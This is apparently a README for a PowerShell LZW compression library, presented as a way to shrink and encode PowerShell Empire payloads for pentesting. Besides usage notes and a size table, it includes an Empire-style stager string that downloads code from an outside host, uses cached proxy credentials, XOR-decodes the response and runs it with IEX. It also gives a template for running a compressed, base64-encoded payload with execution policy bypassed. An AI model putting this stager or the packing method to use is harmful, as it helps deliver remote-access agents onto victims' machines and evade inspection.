License
-------

DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 

Version 2, December 2004 
                    
Copyright (C) 2004 Sam Hocevar <sam@hocevar.net> 

Everyone is permitted to copy and distribute verbatim or modified 

copies of this license document, and changing it is allowed as long 

as the name is changed. 

DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 
           
TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION 

1. You just DO WHAT THE FUCK YOU WANT TO.



Powershell developper ?
-----------------------
I'm far away from a real Powershell developper, so be free to propose improvements and code size reduction tricks.

Why Powershell ?
-----------------------
Because it's increasingly used for pentestings.
Note that Powershell is the dirtiest programmation language ever (I've already programmed in TCL, Perl and tried Ocaml ^_^).

PoshLZW
--------
`PowerShell LZW` is a LZW compression/decompression library for Powershell 2.0

```
Usage: Powershell -ExecutionPolicy Bypass -File PoshLZW.ps1 [-Compress|Decompress] [-iCodingSize <size>] [-Datas <datas>]
-Compress       LZW compression
-Decompress     LZW decompression
-iCodingSize    Dictionnary size (9 to 15)
-Datas          Datas to compress (normal string or byte array)
                      or decompress (base64 encoded byte array)
-Test           Test the script

Example: 
 > powershell -ex bypass -f PoshLZW.ps1 -C -i 9 -Da `"Hello dear library`"
   CSQZTYbDeIDIZTCchAbDSYjlCDyA

 > powershell -ex bypass -f PoshLZW.ps1 -De -Da CSQZTYbDeIDIZTCchAbDSYjlCDyA
   Hello dear library

 > powershell
 PS> Import-Module .\PoshLZW.ps1
 PS> $aBytes = [io.file]::ReadAllBytes("testfile.bin");
 PS> $aComp = LZWCompress -sContent $aBytes -iCodingSize 9;
 PS> $sDecomp = LZWDecompress -aCompressed $aComp;
 PS> $aResult =  [System.Text.Encoding]::UTF8.GetBytes($sDecomp);
 PS> [io.file]::WriteAllBytes("testfile-result.bin", $aResult);
```

Powershell 2.0 ?
----------------
By default, if you wanna have compatility you'll have to use v2.0, as it's the case for PowerShell Empire.


iCodingSize !!?
---------------
LZW work by building a ephemeral dictionnary, feeded then by following bytes. The main idea is to encode bytes not on 8-bits but on iCodingSize-bits (9 to 15).

Why min at 9 ? 'cause less would mean size growth.

Why max at 15 ? Well... why not ;-)

This value is also the maximum size of the dictionnary : 2^iCodingSize-1.

The value is stored in the output at index 0, encoded on 8-bits (a normal byte).


Five functions
---------------
Five Long functions :
* Bits-Shift : a simple bits shifting function that don't fucking exists in Powershell 2 !!?
* Bits-Read : read n-bits from an array of Bytes, at a certain position
* Bits-Write : write n-bits to an array of Bytes, at a certain position
* LZWCompress : Compress
* LZWDecompress : Decompress

These too long functions have been manually shortened to save space:
* bs (for Bits-Shift), 62 bytes long
* bw (for Bits-Write), 247 bytes long
* lzwc (for LZWCompress), 405 bytes long
* br (for Bits-Read), 235 bytes long
* lzwd (for LZWDecompress), 359 bytes long

Could certainly be optimized ;-)


How to use it in your own code
-----------------------------------------
Best used in your own code, with the short version. Copy/paste PoshLZW_short.ps1 content in your own code:
* bs, bw, lzwc functions for compression
* bs, br, lzwd functions for decompression
Don't forget the shortcut '$m_=[math];' ;-)

Here is an exemple of a PowerShell payload that can be used with PowerShell Empire:

A PowerShell payload, that only decompress, will look like :
```
C:\> powershell
PS> Import-Module .\PoshLZW.ps1
PS> # or Import-Module .\PoshLZW_short.ps1
PS> $sMyPayload = "write-host 'My P0wny payload Here !!!';";
PS> $aCompressed = LZWCompress -sContent $sMyPayload -iCodingSize 9;
PS> # or $aCompressed = lzwc $sMyPayload 9;
PS> $sB64Payload = [convert]::ToBase64String($aCompressed);
PS> $sB64Payload;
CTucjSdDKLTQbzmdBAJyaeRAUBgdzdDTgYTybDeYTIICQZTkZRAIZCJx2A==
```
Then, the payload will be :
```
$m_=[math];function bs{...}function br{...}function lzwd{...}IEX(lzwd ([byte[]]([System.Convert]::FromBase64String("CTucjSdDKLTQbzmdBAJyaeRAUBgdzdDTgYTybDeYTIICQZTkZRAIZCJx2A=="))))
```

Then you can also execute the payload in command line : powershell -nop -noni -ex bypass -c here-the-payload.
But take care about the command line max length ;-)


Good rate ?
----------------
Here you'll find a comparison table of different payloads.
* Text : normal ps1 file/payload, without optimisation.
* H : overhead of 701 bytes (LZWDecompress, Bits-Read, Bits-Shift and IEX).
* 9-15 : iCodingSize, meaning encoding size in bits and also dictionnary size.
A way to use compression could be to run "powershell -c H+B64(LZW(T,9))"

 
|                      | Launcher | Stager |  Agent  |
|---------------------:|---------:|-------:|--------:|
|       Text as T      |   418    |  4 909 |  44 041 |
|           B64(T)     | 1 116    | 13 092 | 117 444 |
|           LZW(T,9)   |   387    |  3 740 |  27 878 |
|     H+B64(LZW(T,9)   | 2 051    | 13 877 |  97 516 |
| B64(H+B64(LZW(T,9))  | 5 472    | 37 008 | 260 044 |
|           LZW(T,10)  |   426    |  3 260 |  24 934 |
|     H+B64(LZW(T,10)  | 2 112    | 12 127 |  85 885 |
| B64(H+B64(LZW(T,10)) | 5 632    | 32 340 | 229 028 |
|           LZW(T,11)  |   469    |  3 145 |  20 474 |
|     H+B64(LZW(T,11)  | 2 261    |`11 576`|  72 444 |
| B64(H+B64(LZW(T,11)) | 6 032    | 30 872 | 193 184 |
|           LZW(T,12)  |   511    |  3 373 |  18 312 |
|     H+B64(LZW(T,12)  | 2 237    | 11 600 |  63 583 |
| B64(H+B64(LZW(T,12)) | 5 968    | 30 936 | 169 556 |
|           LZW(T,13)  |   554    |  3 654 |  16 589 |
|     H+B64(LZW(T,13)  | 2 426    | 12 788 | `58 306`|
| B64(H+B64(LZW(T,13)) | 6 472    | 34 104 | 155 484 |
|           LZW(T,14)  |   596    |  3 935 |  17 545 |
|     H+B64(LZW(T,14)  | 2 481    | 13 243 |  59 852 |
| B64(H+B64(LZW(T,14)) | 6 616    | 35 316 | 159 608 |
|           LZW(T,15)  |   639    |  4 216 |  18 798 |
|     H+B64(LZW(T,15)  | 2 611    | 13 944 |  63 437 |
| B64(H+B64(LZW(T,15)) | 6 964    | 37 184 | 169 168 |



Example
-------

Stats
```
$ PS > $text = '$Wc=NEW-ObjEcT SYStEM.Net.WEBCliENT;$u="Test/5.0 (Windows NT 5.1; Trident/1.0;) like Gecko";$wc.HeADerS.ADD("User-Agent",$u);$wc.ProXY = [SYSTem.Net.WEBREQuEsT]::DEFAulTWebPROXY;$WC.PRoxy.CReDEnTIaLS = [SYStEM.NET.CRedEnTiALCACHe]::DEFAulTNetwORKCredenTiaLs;$K="aaaaaaaabbbbbbbbcccccccceeeeeeee";$I=0;[chAr[]]$b=([CHAr[]]($wC.DowNlOaDSTRing("http://1.2.3.4:80/index.asp")))|%{$_-BXoR$k[$i++%$k.LeNgTH]};IEX ($B-jOIn"")';
$ PS > #$text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes("stager.ps1"));
$ PS > #$text = [System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes("agent.ps1"));
$ PS > write-host "|                 Text   |" $text.length
$ PS > write-host "|             B64(Text)  |" ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text))).length
$ PS > foreach ($i in 9..15){
$ PS > 	$lzw = lzwc $text $i;
$ PS > 	write-host "|           LZW(T,$i)  |" $lzw.length;
$ PS > 	$64lzw = [convert]::ToBase64String($lzw);
$ PS > 	$overhead='$m_=[math];function bs{param($v,$s)return $m_::Floor($v*$m_::Pow(2,-$s))}function br{param($o,$c,$a)$p=$i=$e=0;$j=$m_::floor(($t=$a.value)*$c/8);$s=($r=8-(($t*$c)%8))-$c;$b=$m_::Pow(2,$c)-1;while($e-lt$c){$p=$p-bor((bs $o[$j+$i] $s)-band$b);$e+=$r;$r=$m_::max($r,8);$s+=8;$i++}$a.value++;return $p}';
$ PS > function lzwd{param($p)$a=$j=0;$v=@();$e=$o="";$c=$p[0];$p=$p[1..$p.length];foreach($i in 0..255){$v+=[string]([char]$i)}$o+=($w=[string]$v[($j=br $p $c ([ref]$a))]);while([math]::floor($a*$c/8)-lt($p.length-1)){$l=$v.count;$j=br $p $c ([ref]$a);$o+=$v[$j];if($j-lt$l){$e=[string]$v[$j]}elseif($j-eq$l){$e=$w+$w[0]}$v+=$w+$e[0];$w=$e}return $o;}IEX(lzwd ([byte[]]([System.Convert]::FromBase64String("'+$lzw+'"))))';
$ PS > 	write-host "|     H+B64(LZW(T,$i)  |" $overhead.length;
$ PS > 	$b64hz = [convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($overhead));
$ PS > 	write-host "| B64(H+B64(LZW(T,$i)) |" $b64hz.length;
$ PS > }
```

Last word ?
-----------

````
         ///\\\  ( Have Fun )
        ( ^  ^ ) /
      __(  __  )__
     / _ `----' _ \
     \__\   _   |__\
      (..) _| _ (..)
       |____(___|     Mynameisv_ 2016
_ __ _ (____)____) _ _________________________________ _'
````